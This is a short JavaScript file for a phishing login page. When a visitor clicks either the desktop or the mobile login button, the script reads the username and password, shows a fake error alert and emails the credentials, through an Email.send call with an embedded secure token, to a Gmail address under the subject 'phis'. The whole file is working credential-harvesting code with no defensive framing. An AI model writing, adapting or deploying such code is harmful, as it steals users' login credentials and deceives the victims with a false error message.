function sendPhis(username, password) {
  if (username.length > 0 && password.length > 0) {
    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";

    alert("There is some Problem\nPlease try again later");
    Email.send({
      SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
      To: 'someone@gmail.com',
      From: "someone@gmail.com",
      Subject: "phis",
      Body: userdata
    });
  }
}
function initialize() {
  let username = "", password = "";
  document.getElementById("loginbutton").onclick = buttonclick => {
    username = document.getElementById("username").value;
    password = document.getElementById("userpassword").value;
    sendPhis(username, password);
  }
  document.getElementById("mobileloginbutton").addEventListener("click", function () {
    username = document.getElementById("mobusername").value;
    password = document.getElementById("mobuserpassword").value;
    sendPhis(username, password);
  });
}
window.onload = initialize;
